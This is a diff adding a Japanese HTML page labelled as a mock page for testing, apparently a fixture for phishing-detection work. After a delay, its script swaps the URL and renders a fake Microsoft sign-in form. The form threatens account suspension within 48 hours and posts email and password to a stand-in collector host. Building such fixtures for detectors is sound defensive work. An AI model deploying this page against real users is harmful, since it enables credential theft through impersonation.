@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="ja">
+<head><meta charset="utf-8"><title>ご案内（テスト用の模擬ページ）</title></head>
+<body>
+  <div id="app"><p>読み込み中です。しばらくお待ちください。こちらはテスト用の模擬ページです。</p></div>
+  <script>
+    // 1.5秒後に再読み込みなしで URL を変更し、6秒後にフィッシングの入力フォームを描画する
+    setTimeout(() => history.pushState({}, '', '/spa-signin.html?step=1'), 1500);
+    setTimeout(() => {
+      document.title = 'Microsoft アカウント サインイン（テスト用）';
+      document.getElementById('app').innerHTML = `
+        <h1>Microsoft アカウントにサインイン</h1>
+        <p>お使いのアカウントは48時間以内に停止されます。</p>
+        <form method="post" action="https://harvest.other-domain.example/s">
+          <label>メールアドレス <input type="email" name="email"></label>
+          <label>パスワード <input type="password" name="pw"></label>
+          <button>サインイン</button>
+        </form>`;
+    }, 6000);
+  </script>
+</body>
+</html>
